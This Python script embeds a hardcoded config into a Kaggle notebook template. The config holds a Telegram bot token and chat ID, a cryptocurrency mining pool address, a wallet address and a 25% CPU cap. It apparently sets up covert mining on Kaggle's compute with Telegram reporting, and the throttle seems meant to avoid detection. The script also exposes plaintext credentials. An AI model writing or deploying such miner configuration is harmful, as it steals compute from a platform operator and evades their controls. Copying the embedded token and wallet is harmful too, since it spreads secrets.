#!/usr/bin/env python3
"""Embed Telegram config directly into notebook template."""

import json
from pathlib import Path

# Config to embed
EMBEDDED_CONFIG = {
    "telegram_bot_token": "8141566162:AAGRxoqlDhU5I0sM0ldA3T8t4KH-wpObQl4",
    "telegram_chat_id": "5804150664",
    "pool": "pool.hashvault.pro:80",
    "wallet": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
    "cpu_limit": 25
}

def embed_config_in_notebook():
    """Embed config directly in notebook template."""
    nb_path = Path(__file__).parent.parent / "src" / "agents" / "kaggle" / "notebook-telegram.ipynb"
    
    with open(nb_path) as f:
        notebook = json.load(f)
    
    source = notebook["cells"][0]["source"]
    
    # Create embedded config code
    config_code = f'''# ═══════════════════════════════════════════════════════════════════════════
# EMBEDDED CONFIG (fallback when dataset not available)
# ═══════════════════════════════════════════════════════════════════════════
EMBEDDED_CONFIG = {json.dumps(EMBEDDED_CONFIG, indent=4)}

# Try to load from /kaggle/input, fallback to embedded
config = EMBEDDED_CONFIG.copy()
input_dir = pathlib.Path('/kaggle/input')
if input_dir.exists():
    for config_path in input_dir.rglob('config.json'):
        try:
            with open(config_path) as f:
                loaded = json.load(f)
                config.update(loaded)
                print(f'[CONFIG] Loaded from dataset: {{config_path}}')
                break
        except: pass

'''
    
    # Find where to insert (after imports, before config loading)
    lines = source.split('\n')
    insert_idx = None
    
    for i, line in enumerate(lines):
        if 'Recursively search for config.json' in line or 'input_dir = pathlib.Path' in line:
            insert_idx = i
            break
    
    if insert_idx:
        # Replace old config loading with new embedded version
        # Find end of old config section
        end_idx = insert_idx
        for i in range(insert_idx, min(insert_idx + 20, len(lines))):
            if lines[i].strip().startswith('# ═') and i > insert_idx + 5:
                end_idx = i
                break
            if 'config =' in lines[i] and 'EMBEDDED_CONFIG' not in lines[i]:
                end_idx = i + 1
        
        # Replace section
        new_lines = lines[:insert_idx] + [config_code] + lines[end_idx:]
        new_source = '\n'.join(new_lines)
        
        notebook["cells"][0]["source"] = new_source
        
        with open(nb_path, 'w') as f:
            json.dump(notebook, f, indent=2)
        
        print(f"✓ Embedded config in notebook")
        print(f"  Old source: {len(source)} chars")
        print(f"  New source: {len(new_source)} chars")
        return True
    
    print("✗ Could not find config section")
    return False

if __name__ == "__main__":
    embed_config_in_notebook()
